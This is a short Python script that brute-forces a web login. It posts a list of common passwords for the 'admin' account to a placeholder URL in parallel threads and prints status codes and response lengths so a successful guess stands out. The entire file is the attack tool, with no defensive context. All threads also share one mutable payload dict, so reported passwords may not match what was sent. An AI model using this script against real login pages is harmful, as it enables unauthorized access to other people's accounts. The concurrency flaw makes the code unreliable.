import requests
import threading

#passowrd array
passwords = ["password1", "password2", "admin", "123456"]

#URL
url = "http://example.com/login"

#POST Paylaod
data = {"username": "admin", "password": ""}


def send_request(password):
    data["password"] = password
    try:
        response = requests.post(url, data=data)
        print(f"Password: {password} | Status: {response.status_code} | Length: {len(response.content)}")
    except Exception as e:
        print(f"Error with password {password}: {e}")


threads = []
for password in passwords:
    thread = threading.Thread(target=send_request, args=(password,))
    threads.append(thread)
    thread.start()


for thread in threads:
    thread.join()
